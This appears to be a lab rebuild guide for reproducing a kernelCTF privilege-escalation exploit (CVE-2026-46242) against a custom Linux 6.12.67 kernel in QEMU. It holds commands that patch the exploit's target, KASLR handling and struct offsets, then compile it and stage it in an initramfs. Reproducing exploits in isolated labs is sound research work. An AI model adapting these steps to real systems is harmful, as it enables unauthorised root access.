# Environment Rebuild Guide: Tier 1 (Linux VM via QEMU)

This guide provides a detailed, step-by-step workflow reconstruction for setting up the Tier 1 environment. It documents the exact inputs, expected outputs, common pitfalls, and verification methods for every stage.

---

## 1. Environment Preparation & Dependencies

**Purpose:** Ensure the host machine has the necessary compilers, emulators, and development headers to build the Linux kernel and the exploit C++ toolchain.

**Expected Input:**
```bash
sudo dnf install -y gcc gcc-c++ make qemu-system-x86-core busybox kernel-devel openssl-devel elfutils-libelf-devel flex bison cpio cmake keyutils-libs-devel libstdc++-static glibc-static patch
```

**Expected Output:**
The package manager resolves and installs the required packages.
`Complete!` or `Nothing to do.`

**Common Mistakes:**
* Missing `cmake` or `libstdc++-static`, leading to cryptic `libxdk` compiler failures later.
* Not having `busybox` statically compiled on the host, causing the rootfs `init` to fail during boot.

**Verification Method:**
Run `gcc --version` and `qemu-system-x86_64 --version`.

**Recovery Procedure:**
If package installation fails, run `sudo dnf clean all && sudo dnf update` and try again.

---

## 2. Automated Base Environment Build (Kernel + Rootfs)

**Purpose:** Automate the tedious downloading of the Linux 6.12.67 kernel, configuration, compilation, and root filesystem packaging.

**Expected Input:**
```bash
./scripts/setup-tier1.sh
```

**Expected Output:**
```text
[1/7] Checking build dependencies...
[2/7] Downloading Linux kernel 6.12.67...
[3/7] Configuring kernel for QEMU...
[4/7] Compiling kernel (this may take 15-30 minutes)...
[5/7] Creating minimal rootfs...
[6/7] Cloning exploit source...
============================================
  Setup Complete!
============================================
```

**Common Mistakes:**
* Terminating the kernel compilation prematurely.
* Running out of disk space (requires ~20GB).

**Verification Method:**
Check for the existence of `linux-6.12.67/arch/x86/boot/bzImage` and `initramfs.cpio` inside `exploit/tier1-linux-vm/`.

**Recovery Procedure:**
If it fails during compilation, run `make clean` inside the `linux-6.12.67` directory and re-run the script.

---

## 3. Exploit Source Code Patching

**Purpose:** The original kernelCTF exploit is tailored for Google's proprietary kernel environment and GCC 11/12. We must patch it to compile on modern GCC 16 and target our custom-built `vmlinux`.

**Expected Input:**
```bash
cd exploit/tier1-linux-vm/security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67/kernel-research/libxdk

# 1. Fix C++ standard template errors in libxdk
sed -i '1i #include <functional>' payloads/PayloadBuilder.cpp
sed -i 's/std::reference_wrapper<PayloadData>/PayloadData*/g' payloads/PayloadBuilder.cpp

# 2. Hardcode our custom target OS to bypass auto-detection
cd ..
sed -i 's/kxdb.AutoDetectTarget()/kxdb.GetTarget("kernelctf", "lts-6.12.67")/g' exploit.cpp

# 3. Bypass KASLR leak due to QEMU kvm64 SIGILL limitations
sed -i 's/leak_kaslr()/kernel_base = 0xffffffff81000000; \/\/ leak_kaslr()/g' exploit.cpp

# 4. Patch struct offsets mapped from our custom vmlinux
sed -i 's/comm = 1928/comm = 1840/g' exploit.cpp
sed -i 's/files = 1984/files = 1896/g' exploit.cpp
sed -i 's/children = 1472/children = 1384/g' exploit.cpp
sed -i 's/sibling = 1488/sibling = 1400/g' exploit.cpp
```

**Expected Output:**
No terminal output (silent success for `sed` commands).

**Common Mistakes:**
* Missing a `sed` command, resulting in a compiled exploit that immediately errors out with `Target not found`.

**Verification Method:**
Run `grep "comm = 1840" exploit.cpp` to ensure the patches applied successfully.

**Recovery Procedure:**
If the source code gets mangled, delete the `security-research` folder and re-run `git clone -b submit-cve-2026-46242 https://github.com/J-jaeyoung/security-research.git`.

---

## 4. Exploit Compilation

**Purpose:** Statically compile the patched exploit payload and link it against `libxdk`.

**Expected Input:**
```bash
make
```

**Expected Output:**
Successful compilation logs ending with a statically linked `exploit` binary. 

**Common Mistakes:**
* Compilation fails with `cannot find -lstdc++` (requires `libstdc++-static` on host).

**Verification Method:**
Run `file exploit`. It should output: `ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked`.

**Recovery Procedure:**
Run `make clean` and ensure all dependencies from Step 1 are installed.

---

## 5. Exploit Injection & QEMU Boot

**Purpose:** Package the compiled exploit into the root filesystem and launch the vulnerable virtual machine.

**Expected Input:**
```bash
cd ../../../../../../ # Back to exploit/tier1-linux-vm
cp security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67/exploit rootfs/bin/exploit
chmod +x rootfs/bin/exploit

cd rootfs
find . -print0 | cpio --null -ov --format=newc > ../initramfs.cpio
cd ..

qemu-system-x86_64 -kernel linux-6.12.67/arch/x86/boot/bzImage -initrd initramfs.cpio -append 'console=ttyS0 quiet nokaslr' -nographic -smp 2 -m 2G -cpu kvm64,+smep,+smap
```

**Expected Output:**
The QEMU VM boots, printing the `bad-epoll-lab` banner, and provides a root shell `#`.

**Common Mistakes:**
* Packaging the exploit into `rootfs/tmp/`. The `init` script mounts an empty `tmpfs` over `/tmp`, completely masking the exploit at runtime. It **must** be placed in `rootfs/bin/`.

**Verification Method:**
Inside the QEMU shell, run `ls -l /bin/exploit`. It should exist and be executable.

**Recovery Procedure:**
If the VM hangs during boot, kill it from another terminal with `killall qemu-system-x86_64`, check your `initramfs` structure, and try again.
